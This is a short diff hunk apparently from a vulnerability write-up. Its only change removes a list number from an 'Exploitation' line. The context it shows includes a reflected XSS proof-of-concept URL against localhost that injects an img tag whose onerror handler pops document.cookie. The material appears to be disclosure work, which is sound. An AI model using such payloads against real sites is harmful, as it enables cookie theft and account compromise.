@@ -22,7 +22,7 @@ in the victim's browser then the attacker can fully compromise that user. For ex
 
 ## Exploitation
 
-1- In XSS I've used the following payload:
+In XSS I've used the following payload:
 
 ```
 http://127.0.0.1:8080/hackerone=%3Cimg%20src=pop%20onerror=alert(document.cookie)%3E
